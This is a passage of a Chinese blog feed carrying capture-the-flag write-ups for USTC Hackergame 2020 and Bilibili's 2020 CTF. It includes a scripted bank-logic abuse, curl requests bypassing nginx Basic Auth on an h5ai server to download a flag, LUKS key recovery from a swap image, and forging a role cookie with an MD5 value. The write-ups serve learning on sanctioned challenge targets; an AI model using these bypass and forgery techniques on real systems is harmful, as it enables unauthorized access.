<span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/create'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ type }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">from</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">to</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">amount</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">transfer</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">from</span>, to, amount</span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/transfer'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ amount, <span class=\"hljs-attr\">dst</span>: to, <span class=\"hljs-attr\">src</span>: <span class=\"hljs-keyword\">from</span> }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">account</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">eatAndEndTheDay</span>(<span class=\"hljs-params\">account</span>) </span>{    <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/eat'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ account }),      ...commonFetchOpt    });  }  <span class=\"hljs-keyword\">try</span> {    <span class=\"hljs-comment\">// 开一张信用卡</span>    <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'credit'</span>);    <span class=\"hljs-comment\">// 开 999 张储蓄卡，并给每张新开的储蓄卡转 167 块钱</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">3</span>; i &lt; <span class=\"hljs-number\">1002</span>; i++) {      <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'debit'</span>);      <span class=\"hljs-keyword\">await</span> transfer(<span class=\"hljs-number\">2</span>, i, <span class=\"hljs-number\">167</span>);    }    <span class=\"hljs-comment\">// 用储蓄卡 1 的初始资金 1000 度过 14 天</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-number\">14</span>; i++) {      <span class=\"hljs-keyword\">await</span> eatAndEndTheDay(<span class=\"hljs-number\">1</span>);    }    <span class=\"hljs-comment\">// 14 天肯定能赚够 1000 块钱了，该获取 flag 了</span>    <span class=\"hljs-keyword\">const</span> req = <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/user'</span>, { ...commonFetchOpt, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> });    <span class=\"hljs-keyword\">const</span> resp = <span class=\"hljs-keyword\">await</span> req.json();    <span class=\"hljs-built_in\">console</span>.log(resp.flag);  } <span class=\"hljs-keyword\">catch</span> (e) {    <span class=\"hljs-built_in\">console</span>.error(e);  }})();</code></pre>\n<h2>超基础的数理模拟器</h2>\n<blockquote><p>……<br>我们在 Hackergame 2020 的网站上部署了一项超基础的数理模拟器。 作为一名数理基础扎实的同学，你一定能够轻松通过模拟器的测试吧。</p></blockquote>\n<p>打开题目后发现要做 400 道定积分，而且答案还要取小数点后六位：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.8/29.png\" width=\"1497\" height=\"412\" class=\"lazy post-img\"></p>\n<p>这道题没有取巧的办法，只有老老实实把 400 道定积分全部做完…..吧？</p>\n<p>这么长的定积分谁手算啊，当然是要用 MatLab 来算啦！徒手转换 LaTex 到 MathLab 太麻烦了，写个脚本来做吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/27.png\" width=\"1150\" height=\"420\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/28.png\" width=\"1146\" height=\"539\" class=\"lazy post-img\"></p>\n<p>UserScript 在 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-js\">这里</a>，好孩子千万不要学习这种方法来解析 LaTex。</p>\n<h2>室友的加密硬盘</h2>\n<blockquote>\n<p>「我的家目录是 512 位 AES 加密的，就算电脑给别人我的秘密也不会泄漏……」你的室友在借你看他装着 Linux 的新电脑时这么说道。你不信，于是偷偷从 U 盘启动，拷出了他硬盘的一部分内容。</p>\n<p><a href=\"https://archive.org/details/roommates_disk_part.img\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>苏卡卡一开始试图把镜像直接挂载在虚拟机上，结果无法启动系统；于是先起了一个 Linux 虚拟机、在 Linux 下将 img 转换为 vmdk 再添加到虚拟机中，结果依然提示「未找到已安装的操作系统或操作系统安装器」。</p>\n<blockquote><p>中国民航于 1992 年在《中国民用航空局关于确保飞行安全的命令》文件中提出了 54 个字「八该一反对」，其中最重要的就是「反对盲目蛮干」</p></blockquote>\n<p>既然通过 img 文件直接启动没有成功，不如先看看这个 img 文件都有什么：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/18.png\" width=\"824\" height=\"864\" class=\"lazy post-img\"></p>\n<blockquote><p>不要在意这个 Ubuntu Kylin，最近狐狐在虚拟机里各种体验各种「国产 Linux 发行版」，虚拟机里正好有 Ubuntu Kylin 所以拿来用的。</p></blockquote>\n<p>由于之前阅读过一些通过内存转储破解全盘加密的文章，所以便去下载了 <a href=\"https://sourceforge.net/projects/findaes/\">findaes</a> 的源码，编译的同时再去重读之前的几篇文章获取思路。看到几篇文章中都是用 findaes 直接读取 raw 的内存转储，于是决定直接用 findaes 爆破硬盘映像文件。首先把 img 用 7z 解压出来，然后一个一个分区映像跑：</p>\n<pre><code class=\"hljs bash\">$ ./findaes /path/to/img1.raw</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/19.jpg\" width=\"867\" height=\"480\" class=\"lazy post-img\"></p>\n<p>根据题干「我的家目录是 512 位 AES 加密的」，但是 findaes 找到的都是 AES-256，所以需要从中筛选出一对 offset 相差为 256bit 的 key 进行拼接，因此还需要注意一点，由于 Intel x86_64 的 little-endian、拼接 key 时需要倒序拼接。</p>\n<blockquote><p>其实这一点我还是比较熟悉的，安装 Hackintosh 时注入十六进制的设备属性时需要互换 bit 也是因为 little-endian。</p></blockquote>\n<p>剩下的就是一对一对 key 的用 <code>sudo cryptsetup luksAddKey --master-key-file</code> 试过去，直到成功解密为止。最后用 swap 里的最后一对 key 成功解密了分区并拿到了 flag <code>flag{lets_do_A_c01d_b00t_next_time}</code> （下次试试冷启动吧！），直到看到 flag 才明白本题的思路是 Linux 休眠后会把内存写入 swap 分区中（macOS 则是写入硬盘上的 <code>sleepimage</code> 文件中），因此和之前读过的从内存转储破解全盘加密的思路是完全一致的。最后再给大家推荐 Red Hat 知识库的一篇文章「<a href=\"https://access.redhat.com/solutions/1543373\">How to recover lost LUKS key or passphrase</a>」。</p>\n<h2>超简易的网盘服务器</h2>\n<blockquote>\n<p>…… 小 C 开始思考技术方案：“听说 h5ai 搭建云盘的方案是不错的 … 使用 Basic Auth 可以做访问控制，可以保护<a href=\"http://202.38.93.111:10120/\">根目录</a>下的文件不被非法的访问 … 等等，有一些文件是可以被分享的，需要一个 <a href=\"http://202.38.93.111:10120/Public\">/Public</a> 目录来共享文件！”</p>\n<p>三分钟后，小 C 同学完成了网盘的搭建。他想：“空着总不好，先得在云盘上放点东西！”。犹豫片刻，他掏出了自己珍藏了三个月的 flag 并上传到了云盘的<a href=\"http://202.38.93.111:10120/\">根目录</a>。</p>\n</blockquote>\n<p>这道题我好像是第五个还是第六个解出来的。这道题很多人没做出来还是有点令我惊讶的。</p>\n<p>直接访问「根目录」会提示 401 需要 HTTP Basic Authentication，聪明的 小 C 肯定不会把密码直接暴露出来的。访问 <code>/Public </code>目录却发现了 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_nginx-conf\"><code>dockerfile</code></a> 和 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_dockerfile\"><code>nginx.conf</code></a> 文件。从 dockerfile 中我们可以知道小 C 是怎么搭建的服务，而 <code>nginx.conf</code> 更值得我们关心（已省去无关紧要的部分）：</p>\n<pre><code class=\"hljs nginx\"><span class=\"hljs-attribute\">index</span> index.php index.html /_h5ai/public/index.php;<span class=\"hljs-comment\"># 根目录是私有目录，使用 basic auth 进行认证，只有我（超极致的小 C)自己可以访问</span><span class=\"hljs-attribute\">location</span> / {    <span class=\"hljs-attribute\">auth_basic</span> <span class=\"hljs-string\">\"easy h5ai. For visitors, please refer to public directory at `/Public!`\"</span>;    <span class=\"hljs-attribute\">auth_basic_user_file</span> /etc/nginx/conf.d/htpasswd;}<span class=\"hljs-comment\"># Public 目录是公开的，任何人都可以访问，便于我给大家分享文件</span><span class=\"hljs-attribute\">location</span> /Public {    <span class=\"hljs-attribute\">allow</span> all;    <span class=\"hljs-attribute\">index</span> /Public/_h5ai/public/index.php;}<span class=\"hljs-comment\"># PHP 的 fastcgi 配置，将请求转发给 php-fpm</span><span class=\"hljs-attribute\">location</span> <span class=\"hljs-regexp\">~ \\.php$</span> {         <span class=\"hljs-attribute\">fastcgi_pass</span>   <span class=\"hljs-number\">127.0.0.1:9000</span>;         <span class=\"hljs-attribute\">fastcgi_index</span>  index.php;         <span class=\"hljs-attribute\">fastcgi_param</span>  SCRIPT_FILENAME  $document_root$fastcgi_script_name;         <span class=\"hljs-attribute\">include</span>        fastcgi_params;}</code></pre>\n<p>由于 Nginx 配置文件不是连续匹配，因此访问 <code>.php</code> 结尾的路径是不会触发 401 HTTP Basic Auth 的（应该没有人会天真地试图获取 <code>/etc/nginx/conf.d/htpassword</code> 吧？）。既然如此，我们为什么不直接访问 <code>h5ai</code> 的 <code>index.php</code> 呢？首先让我们请求一下 <code>/Public</code> 目录下的 h5ai 后台页面 <code>/Public/_h5ai/public/index.php</code>：</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/Public/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>那么「根目录」下的 <code>/_h5ai/public/index.php</code> 呢？</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>不出所料，直接访问 <code>index.php</code> 也会返回 200 OK，而不是 401。</p>\n<p>虽然直接访问 <code>/_h5ai/public/index.php</code> 不会返回 401，但是 GET 这个路径默认是返回 h5ai 的后台调试页面。由于 h5ai 是开源的、我们可以前往 <a href=\"https://github.com/lrsjng/h5ai\">h5ai 的 GitHub</a> 对其代码进行审计，发现 <a href=\"https://github.com/lrsjng/h5ai/blob/master/src/_h5ai/private/php/core/class-api.php\">h5ai 提供了一系列 API</a>，可以通过 POST 请求列出目录内容和下载文件。首先试试能不能用 API 列出根目录下的文件内容：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/json;charset=UTF-8'</span> --data-binary <span class=\"hljs-string\">'{\"action\":\"get\",\"items\":{\"href\":\"/\",\"what\":1}}'</span> | jq{  <span class=\"hljs-string\">\"items\"</span>: [    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986831000,      <span class=\"hljs-string\">\"size\"</span>: 789419,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">true</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">true</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/Public/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986830000,      <span class=\"hljs-string\">\"size\"</span>: 396458,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">false</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">false</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/flag.txt\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603489315000,      <span class=\"hljs-string\">\"size\"</span>: 24    }  ]}</code></pre>\n<p>诶嘿嘿，我们看到 <code>/flag.txt</code> 啦！接下来就是用 API 下载 <code>flag.txt</code> 文件了：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/x-www-form-urlencoded'</span> --data-raw <span class=\"hljs-string\">'action=download&amp;as=flag.txt.tar&amp;type=php-tar&amp;baseHref=/&amp;hrefs[0]=/flag.txt'</span> -o flag.txt.tar$ tar xzf flag.txt.tar$ cat flag.txt <span class=\"hljs-comment\"># Flag 到手啦</span></code></pre>\n<h2>超安全的代理服务器</h2>\n<blockquote>\n<p>在 2039 年，爆发了一场史无前例的疫情。为了便于在各地的同学访问某知名大学「裤子大」的网站进行「每日健康打卡」，小 C 同学为大家提供了这样一个代理服务。曾经信息安全专业出身的小 C 决定把这个代理设计成最安全的代理。</p>\n<p><strong>提示：浏览器可能会提示该 TLS 证书无效，与本题解法无关，信任即可。</strong></p>\n</blockquote>\n<p>「浏览器可能会提示该 TLS 证书无效」这句话至关重要。想想看为什么别的题都是通过 HTTP 访问的、唯独这道题要用 HTTPS？什么东西需要 HTTPS 才能工作、在 HTTP 下不工作呢？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/9.png\" width=\"1165\" height=\"294\" class=\"lazy post-img\"></p>\n<p>虽然 HTTP/2 本身不要求 TLS 实现（例如 H2C、HTTP/2 ClearText）、并且有通过 HTTP/1.1 升级到 HTTP/2 的协商方法（参见 <a href=\"https://blog.skk.moe/post/http3-alt-svc/#HTTP-2-%E7%9A%84%E5%8D%8F%E5%95%86%E6%96%B9%E5%BC%8F\">我之前的文章「HTTP/3：HTTP Alternative Services 作为协商方式」中的「HTTP/2 的协商方式」章节</a> ），但是所有支持 HTTP/2 的浏览器都要求 HTTP/2 必须通过 TLS 传输、并在 Client Hello 中通过 ALPN Protocol 进行协商。扯远了，看看题目。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/8.png\" width=\"750\" height=\"400\" class=\"lazy post-img\"></p>\n<p>「我们已经向您 <strong>推送（PUSH）</strong> 了最新的 <strong>Secret</strong> ，但是你可能无法直接看到它」。现在我们知道了，这道题和 HTTP/2 Server Push 有关。解码 HTTP/2 帧最好的方法自然是使用 Wireshark。首先我们要让 Wireshark 能够解密 HTTPS 内容，最简单的方法是使用 <code>SSLKEYLOGFILE</code> 环境变量。</p>\n<blockquote><p>警告！使用 <code>SSLKEYLOGFILE</code> 环境变量非常危险，任何获取该变量的软件都可以随意解密你的 HTTPS 流量！因此，务必仅针对某一需要解密流量的软件、在某一次性 Session 下设置该环境变量！</p></blockquote>\n<p>打开 Chrome，在 <code>chrome://version/</code> 中查看可执行文件路径：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/10.png\" width=\"1196\" height=\"270\" class=\"lazy post-img\"></p>\n<p>然后在终端中通过预设环境变量直接启动 Chrome：</p>\n<pre><code class=\"hljs bash\">SSLKEYLOGFILE=<span class=\"hljs-string\">\"/path/to/ssllog.txt\"</span> <span class=\"hljs-string\">\"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\"</span></code></pre>\n<p>启动 Wireshark 偏好设置中找到 Protocol - TLS、配置 (Pre)-Master-Secret log filename：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/11.png\" width=\"687\" height=\"514\" class=\"lazy post-img\"></p>\n<p>现在，再通过启动的 Chrome 访问「Smart Proxy!」，可以看到 Wireshark 完整解密了 Chrome 的所有 HTTPS 流量。在 Wireshark 中使用下述过滤器找出本题的流量：</p>\n<pre><code class=\"hljs plaintext\">ip.addr == 146.56.228.227</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/12.png\" width=\"1371\" height=\"279\" class=\"lazy post-img\"></p>\n<p>在过滤后的流量中我们很快就可以找到 PUSH_PROMISE 帧、告诉了我们如何获得 secret 和第一个 flag：<code>GET /ebe087a0-68e5-4280-b605-b98b89488e1e</code>。</p>\n<p>获得第一个 flag 后，我们可以在终端中 Ctrl + C 关闭 Chrome。之后从 Dock、桌面、Finder、Spotlight 等方法「正常启动」Chrome 是不会再将 TLS 握手的信息输出到 SSLKEYLOGFILE 的。</p>\n<h2>尾声</h2>\n<p>今年的 USTC Hackergame 对我来说运气的成分远高于能力的成分，不少题目都是侥幸做出来的，而且对 <code>binary</code> 和 <code>math</code> 一窍不通的我这两类题几乎一道题都没做出来；比赛期间甚至收到了主办方邀请提交「非官方题解」，受宠若惊（狐狐暗自高兴）；最后拿到了 3250 分，排名侥幸挤进了前 50、与真正的 CS 大佬和 CTF 师傅们在榜上合影，瑟瑟发抖（非常害怕）。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.9/31.png\" width=\"1109\" height=\"135\" class=\"lazy post-img\"></p>\n<p>没有对比就没有伤害，相比 <a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">两周前 Bilibili 的「1024  程序员节 CTF」</a>，USTC Hackergame 不论是在难度梯度分布、题目水平、趣味性、活动整体质量上都远高一个层次。引用组委会成员「Zihan Zheng」在知乎「<a href=\"https://www.zhihu.com/question/351947330/answer/866177844\">参加中国科学技术大学第六届信息安全大赛（Hackergame 2019）是怎样一种体验？</a>」提问中的回答：</p>\n<blockquote><p>我们举办的 Hackergame 的初衷就是对新人友好，增加趣味性，强调教育意义。我看到有些同学反馈说题目偏简单、逆向题偏少等等，我想强调，我们这个比赛虽然是提交 flag 的形式，但<strong>不是 CTF 比赛，不会与国内外的 CTF 比赛对标</strong>。我们会把这个特色坚持下去，希望大家不要从经验丰富的 CTF 选手视角来评价我们的比赛。</p></blockquote>\n<p>如果说 Hackergame 的初衷是「对新人友好，增加趣味性，强调教育意义」，IMHO 不论是 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">往届</a> 还是今年的比赛都完美达成了这一点；毫无疑问地，明年的比赛我依然会参加。最后当然是要在「尾声」中喊一句口号：</p>\n<blockquote><p>「我有一个绝妙的解法，可惜我号太少，说不出来」</p></blockquote>\n<div class=\"license\"> <div class=\"license-title\">USTC Hackergame 2020（中科大信安赛）write up</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hackergame-2020-write-up/\">https://blog.skk.moe/post/hackergame-2020-write-up/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-11-06</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hackergame-2020-write-up/"},{"title":"Bilibili 2020「1024 程序员节」CTF Write Up","date":"2020-10-25 09:44:00","description":"\n<blockquote><p>周六不放假休息，还在这加班搞 CTF？</p></blockquote>\n<p>10 月 24 日不睡觉、凌晨两点钟我还在水群，结果在 USTC@LUG 的群里看见有人在打 Bilibili 的 CTF。我刚刚好一年（指 370 天）没有打过 CTF 了（上一次打正式的 CTF 还是去年参加的 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">USTC Hackergame 2019</a>），所以想着来玩玩。虽然 CTF 结束之前不应该分享和公开 Write Up 和题解，不过 Bilibili 这 CTF 既然这么离谱，那我也没必要按照常理出牌。</p>\n<span></span><blockquote><p>本文更新于 2020 年 10 月 25 日下午 6 点（China Standard Time）。</p></blockquote>\n<p>由于这次 Bilibili 的 CTF 题实在没有什么存档研究的必要，我的 Write Up 里就留一些代码片段和截图，大家也没有复盘的必要。</p>\n<h2>页面的背后是什么 &amp; 真正的秘密只有特殊的设备才能看到</h2>\n<p>一个页面，两道题。打开来就是这个页面：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/1.png\" width=\"1901\" height=\"720\" class=\"lazy post-img\"></p>\n<p>curl 太慢了而且没有代码高亮、直接在地址栏通过 <code>view-source:</code> 看看源码，把 JavaScript 拿出来：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/admin\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            <span class=\"hljs-keyword\">var</span> input = <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"flag1\"</span>);            input.value = <span class=\"hljs-built_in\">String</span>(data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag1'</span>).html(<span class=\"hljs-string\">\"接口异常，请稍后再试～\"</span>);        }    }})</code></pre>\n<p>所以第一题的 Flag 就是 <code>GET /api/admin</code> 了。在页面上 <code>#flag1</code> 元素是被包裹在一个 <code>display: none</code> 的容器里的，不过审查元素或者直接请求访问 API 都能拿到第一题的 Flag。</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/2\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"flag2: \"</span> + data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"需要使用bilibili Security Browser浏览器访问～\"</span>);        }    }})</code></pre>\n<p>第二题要求用「bilibili Security Browser」访问，有没有让你想起来前年 USTC Hackergame 2018 的「黑曜石浏览器」？</p>\n<p>直接用 <code>bilibili Security Browser</code> 作为 User-Agent 请求 API 即可获得 Flag，注意别忘了带上 <code>Session</code> 这个 Cookie，这个是 Bilibili 账户登录状态。</p>\n<blockquote>\n<p>Chromium Based 浏览器本身内置了修改了 User-Agent 的功能。打开 DevTools 的设置菜单、在「Devices」里添加一个新的设备，此处可以指定 User-Agent：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/2.png\" width=\"830\" height=\"301\" class=\"lazy post-img\"></p>\n<p>之后就可以使用「bilibili Security Browser」访问了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/3.png\" width=\"751\" height=\"666\" class=\"lazy post-img\"></p>\n</blockquote>\n<h2>密码是啥？</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/4.png\" width=\"1905\" height=\"853\" class=\"lazy post-img\"></p>\n<p>这道题没啥好 Write Up 的，全部靠猜。用户名是 <code>admin</code> 密码是 <code>bilibili</code>。</p>\n<blockquote><p>你这算哪门子 CTF 啊？又不靠社工，真就硬猜？</p></blockquote>\n<p>以及，你给我翻译翻译，什么叫做 falg？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/5.png\" width=\"431\" height=\"731\" class=\"lazy post-img\"></p>\n<h2>对不起，权限不足～</h2>\n<p>首次访问：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/6.png\" width=\"1899\" height=\"543\" class=\"lazy post-img\"></p>\n<p>刷新一次：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/7.png\" width=\"1901\" height=\"538\" class=\"lazy post-img\"></p>\n<p>有趣，看一下源代码：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/4\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-built_in\">console</span>.log(data);        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～答案是 : {{ \"</span> + data.data + <span class=\"hljs-string\">\" }}\"</span>.toLowerCase() )        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"有些秘密只有超级管理员才能看见哦~\"</span>)        }    }})</code></pre>\n<p>又是 API 返回 flag，用手指头想都知道鉴权是 Cookie 做的，打开 F12 查看 Cookie：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/8.png\" width=\"646\" height=\"46\" class=\"lazy post-img\"></p>\n<p>两个 Cookie，一个是 <code>session</code>，是 Bilibili 账户登录状态的 cookie；另一个是 <code>role</code>，毫无疑问就是我们下手的对象：</p>\n<pre><code class=\"hljs plaintext\">role=ee11cbb19052e40b07aac0ca060c23ee</code></pre>\n<p>打 CTF 的人应该早就把这一串刻进 DNA 里了。即使不知道这串字符是什么东西，丢进搜索引擎后也会知道这是 <code>user</code> 的 MD5。接下来思路就很清晰了，通过将 <code>role</code> 的 Cookie 改成另一串 MD5 即可。</p>\n<p>不过这就是这道题离谱的地方了，这道题要把 <code>role</code> 改成 <code>Administrator</code> 的 MD5（你没有看错，首字母是大写的）：</p>\n<pre><code class=\"hljs plaintext\">role=7b7bc2512ee1fedcd76bdc68926d4f7b</code></pre>\n<p>改好 Cookie 刷新页面就可以拿到 flag 了。</p>\n<h2>别人的秘密</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/9.png\" width=\"1897\" height=\"512\" class=\"lazy post-img\"></p>\n<pre><code class=\"hljs js\">$(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{    (<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">$</span>) </span>{        $.getUrlParam = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">name</span>) </span>{            <span class=\"hljs-keyword\">var</span> reg = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">RegExp</span>(<span class=\"hljs-string\">\"(^|&amp;)\"</span> + name + <span class=\"hljs-string\">\"=([^&amp;]*)(&amp;|$)\"</span>);            <span class=\"hljs-keyword\">var</span> r = <span class=\"hljs-built_in\">window</span>.location.search.substr(<span class=\"hljs-number\">1</span>).match(reg);            <span class=\"hljs-keyword\">if</span> (r != <span class=\"hljs-literal\">null</span>) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">unescape</span>(r[<span class=\"hljs-number\">2</span>]); <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">null</span>;        }    })(jQuery);    <span class=\"hljs-keyword\">var</span> uid = $.getUrlParam(<span class=\"hljs-string\">'uid'</span>);    <span class=\"hljs-keyword\">if</span> (uid == <span class=\"hljs-literal\">null</span>) {        uid = <span class=\"hljs-number\">100336889</span>;    }    $.ajax({        <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/5?uid=\"</span> + uid,        <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,        <span class=\"hljs-attr\">success</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{            <span class=\"hljs-built_in\">console</span>.log(data);            <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>) {                <span class=\"hljs-comment\">// 如果有值：前端跳转</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～flag : \"</span> + data.data)            } <span class=\"hljs-keyword\">else</span> {                <span class=\"hljs-comment\">// 如果没值</span>                $(<span 